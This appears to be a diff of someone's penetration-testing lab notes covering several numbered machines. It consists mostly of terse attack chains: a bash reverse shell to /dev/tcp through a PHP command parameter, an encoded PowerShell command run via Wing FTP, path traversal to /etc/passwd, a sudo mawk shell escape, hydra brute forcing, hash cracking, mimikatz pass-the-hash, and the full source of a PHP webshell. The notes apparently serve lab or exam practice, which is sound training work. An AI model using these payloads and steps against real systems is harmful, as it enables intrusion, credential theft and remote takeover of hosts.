@@ -58,17 +58,47 @@ ftp -> backup.xml.txt -> creds
 Wing FTP service vulnerable -> https://www.exploit-db.com/exploits/50720 -> edit exploit with print
 on web POST /admin_lua_script.html.... data:command=os.execute('powershell -Encodedcommand "<>")
 #machine14
-php site -> System($GET['cmd']); -> http://192.168.xx.112:8006/?cmd=bash -c "bash -i >%26/dev/tcp/<>/443 0>%261"
+php site -> System($GET['cmd']); -> http://<>:8006/?cmd=bash -c "bash -i >%26/dev/tcp/<>/443 0>%261"
 #machine15
 enumeration script in webserver -> disclosure database credentials -> mysql -h <> -u <> -p <> -> exfiltrate username and hash -> hashcat <rockyou> -> ssh
- 
-
-
-
-
-
-
-
-
-
- 
+#PE
+sudo -l -> https://gtfobins.github.io/ 
+exiftool privesc exploit github -> https://github.com/convisolabs/CVE-2021-22204-exiftool -> replae ip on source -> run exploit on localhost
+#machine16
+wordpress -> https://www.exploit-db.com/exploits/40290 -> http://<>/wp-content/plugins/mailmasta/inc/campaign/count_of_send.php?pl=/etc/passwd -> copy username in file
+ftp anonymous -> get file and copy password in a file
+use hydra with user and password lists on ssh
+#PE
+sudo -l -> https://gtfobins.github.io/gtfobins/mawk/
+sudo mawk 'BEGIN{system{("/bin/sh")}'
+#machine17
+anonymousFTP-> FTPWING configuration disclosure -> hash -> crackstation MD5 hash
+log in administration pannel on 5466 and create a new user 
+log in FTP with new user
+cleartext credential on desktop -> RDP -> admin CMD -> mimikatz -> administrator hash or dump sam or system -> PtH via RDP
+#machine18
+worpress 80 -> wpscan -> https://www.exploit-db.com/exploits/50378 -> php shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+#PE
+cat /srv/www/wordpress/wp-config.php
+ssh creds
+#machine19
+enumerate webserver -> default creds user:user -> RCE -> https://www.exploit-db.com/exploits/49996 -> upload webshell
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); 
+?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+</html>
+#PE
+see public key in ssh -> chmod 600 id_rsa -> ssh -i id_rsa <user>@<>
